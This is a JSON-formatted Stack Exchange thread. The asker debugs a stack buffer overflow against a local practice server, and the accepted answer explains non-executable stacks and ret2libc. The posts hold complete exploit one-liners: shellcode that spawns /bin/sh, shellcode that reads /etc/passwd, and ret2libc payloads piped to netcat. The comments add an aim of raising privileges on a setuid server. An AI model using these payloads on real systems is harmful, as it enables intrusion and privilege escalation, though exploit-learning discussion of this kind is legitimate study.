@@ -1,0 +1,53 @@
+{
+  "title": "Buffer overflow on server",
+  "link": "https://reverseengineering.stackexchange.com/questions/14957/buffer-overflow-on-server",
+  "content": "I have a server (for reference: pastebin.com/ghJX69uH) that I can netcat to and it will ask to input a message.\n\nI know it is vulnerable to buffer overflow, but I can't seem to get the shellcode to run. I have successfully pointed the return address back to the NOP slide and it hits the /bin/sh but it does not spawn a shell. Here is my code:\n\n```\necho \"`python -c 'print \"\\x90\"*65517 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"  + \"\\xac\\xf3\\xfe\\xbf\"*10 + \"  \n\"'`\" | nc 127.0.0.1 1111\n\n```\nIt's a simple buffer overflow with [NOP SLIDE | SHELLCODE (spawn shell /bin/sh) | return address]\n\nThe first image shows that the return address is 0xbffef3ac which goes to NOP sled, so all is OK! The second image shows a SIGSEGV with no shell, nothing happens. \n\n\n\n\nWhat's going on here? I had a look at ebp and it showed something weird: my \\x90 followed by what should be my shellcode, but looking differently. Any insights on what could be wrong or how to go about this?\n\n```\n0xbffef42c: 0x90909090  0x90909090  0x90909090  0x90909090\n0xbffef43c: 0x90909090  0x90909090  0x90909090  0x90909090\n0xbffef44c: 0x90909090  0x50c03190  0x732f2f68  0x622f6868\n0xbffef45c: 0xe3896e69  0xbffef468  0x00000000  0x6e69622f\n0xbffef46c: 0x68732f2f  0x00000000  0xbffef3ac  0xbffef3ac\n0xbffef47c: 0xbffef3ac  0xbffef3ac  0xbffef3ac  0xbffef3ac\n0xbffef48c: 0xbffef3ac  0x00000000  0x00000000  0x00000000\n0xbffef49c: 0x00000000  0x00000000  0x00000000  0x00000000\n\n```\nEdit: Format of code is from numberphile, shellcode is from http://shell-storm.org/shellcode/files/shellcode-827.php, which I ran and spawns a shell. I tried adding padding (I put A's) between shellcode and return address, but something strange happens again:\n\n```\nNew code: echo \"`python -c 'print \"\\x90\"*65490 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"  + \"A\"*27 + \"\\xac\\xf4\\xfe\\xbf\" + \"  \n\"'`\" | nc 127.0.0.1 1129\n\n\n0xbffef42c: 0x90909090  0x90909090  0x90909090  0xc0319090\n0xbffef43c: 0x2f2f6850  0x2f686873  0x896e6962  0x895350e3\n0xbffef44c: 0xcd0bb0e1  0x41414180  0x41414141  0x41414141\n0xbffef45c: 0x41414141  0x41414141  0x41414141  0x00000001\n0xbffef46c: 0xbffef4ac  0x08049000  0x00000004  0xbffff4a4\n0xbffef47c: 0xbffff490  0xbffff48c  0x00000004  0x00000000\n0xbffef48c: 0x00000000  0x00000000  0x00000000  0x00000000\n0xbffef49c: 0x00000000  0x00000000  0x00000000  0x00000000\n0xbffef4ac: 0x00000000  0x00000000  0x00000000  0x0000000\n\n```\nEdit: So i managed to successfully print all of the etc/passwd, but not sure why the /bin/sh shellcode doesnt work\n\nWorks: /etc/passwd\n\n```\necho \"`python -c 'print \"\\x90\"*65478+\"\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x51\\xb0\\x05\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\\x03\\x66\\xba\\xff\\x0f\\x66\\x42\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb3\\x01\\xb0\\x04\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\"  +\"AAAA\\x9c\\xf3\\xfe\\xbf\\x9c\\xf3\\xfe\\xbf\" + \"  \n\"'`\" | nc 127.0.0.1 2010\n\n```\nDoesnt't work: /bin/sh\n\n```\necho \"`python -c 'print \"\\x90\"*65513 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"AAAA\\x9c\\xf3\\xfe\\xbf\\x9c\\xf3\\xfe\\xbf\\x9c\" + \"  \n\"'`\" | nc 127.0.0.1 3003\n\n```\n",
+  "votes": "1",
+  "answers": 1,
+  "views": "845",
+  "tags": [
+    "gdb",
+    "exploit",
+    "buffer-overflow",
+    "shellcode"
+  ],
+  "user": "user153882",
+  "time": "Mar 21, 2017 at 21:55",
+  "comments": [],
+  "answers_data": [
+    {
+      "content": "We have two major stack protection for buffer overflows:\n\nYou land on nopsled but, you get segmentation fault. Because your operating system marked program stack as non-executable and processor raises the exception when program counter addresses that segment. But, even we have an executable stack (for GCC use -z execstack) your program crashes:\n\n\n\nI changed shellcode to read /etc/passwd, it works until another SIGSEGV. It is not relevant why your previous shellcode doesn't work, it is a practical problem.\n\n\n\nFor another scenario:\n\nHow can we get around non-executable stack? The most common way is a method called ret2libc (return to libc) using system(const char *). But, we will use _exit(int) for simplicity. For our new attack, I compiled it with non-executable stack option and send the same stream.\n\n```\n$ nc localhost 1337 < exp.loit\n\n```\nLet's look our stack:\n\n\n\nWe can't understand which part of your input overflows where and we need that to pass the argument(s). I tried a different payload to find what goes where:\n\n```\npython -c 'print \"\\x90\"*65482 + \"\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x51\\xb0\\x05\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\\x03\\x66\\xba\\xff\\x0f\\x66\\x42\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb3\\x01\\xb0\\x04\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\"  + \"\\x90\"*12 + \"\\xac\\xf3\\xfe\\xbf\" +\"\\x00\\x11\\x22\\x33\"*2 + \"  \n\"' > exp.loit\n\n```\nWe get:\n\n\n\nWe just need _exit address\n\n```\ngdb-peda$ p &_exit\n$1 = (<text variable, no debug info> *) 0xb7ec6f24 <_exit>\n\n```\nNow we are ready to execute our exploit:\n\n```\npython -c 'print \"\\x90\"*65482 + \"\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x51\\xb0\\x05\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\\x03\\x66\\xba\\xff\\x0f\\x66\\x42\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb3\\x01\\xb0\\x04\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\"  + \"\\x90\"*12 + \"\\x24\\x6f\\xec\\xb7\" +\"\\x01\\x00\\x00\\x00\"*2 + \"  \n\"' > exp.loit\n\n```\n\n\nBasically ret2libc is that.\n\n",
+      "votes": "3",
+      "user": "Kerim Can Kalıpcıoğlu",
+      "time": "Dec 5, 2020 at 5:32",
+      "is_accepted": true,
+      "comments": [
+        {
+          "user": "user153882",
+          "text": "Thanks for the writeup! While i experiment with this retlibc, could you share what you used for \"read /etc/passwd\". I replaced my shellcode with that and redid the NOP sled, but still not able to get any result, strangely. Did you use a different format for your shellcode?",
+          "time": null
+        },
+        {
+          "user": "user153882",
+          "text": "Oh, nvm, I had to view it from gdb using  > echo \"python -c 'print \"\\x90\"*65482 + \"\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x51\\xb0\\x05\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\\x03\\x66\\xba\\xff\\x0f\\x66\\x42\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb3\\x01\\xb0\\x04\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\"  + \"\\xac\\xf3\\xfe\\xbf\"*10 + \"  \n\"'\" | nc 127.0.0.1 1111`",
+          "time": null
+        },
+        {
+          "user": "user153882",
+          "text": "I need to be able to this with the given server which has privleges to setuid raise group privleges. Is there not a way to run it via the first way? If you are able to execute /etc/passwd, surely the no exec stack isnt working and it is possible to run other commands ?",
+          "time": null
+        },
+        {
+          "user": "Kerim Can Kalıpcıoğlu",
+          "text": "Try to use python -c 'print \"xxxxx\" | cat | nc localhost 1337 with working shellcode.",
+          "time": null
+        },
+        {
+          "user": "user153882",
+          "text": "No success with that either, however, I've been told that for each connection a fork happens, and that a simple solution is to patch the fork instruction and make it single threaded. I can follow gdb set follow-fork-mode child to follow the process. Anything else you can make from that hint?",
+          "time": null
+        }
+      ]
+    }
+  ]
+}
